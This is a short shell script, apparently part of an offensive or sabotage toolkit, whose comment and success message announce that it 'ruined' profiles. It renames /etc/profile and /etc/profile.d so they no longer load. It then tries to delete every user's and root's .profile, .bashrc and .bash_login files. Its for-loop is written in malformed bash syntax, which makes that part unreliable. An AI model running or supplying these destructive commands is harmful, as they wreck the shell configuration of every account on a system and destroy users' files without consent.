# Proflies, be gone
mv /etc/prof{i,y}le.d; mv /etc/prof{i,y}le
for f in ('~/.profile' '~/.bashrc' '~/.bash_login'); do 
    find /home /root -name "$f" -exec rm {} \;
done

echo "[+] Ruined profile and deleted .bashrc files."
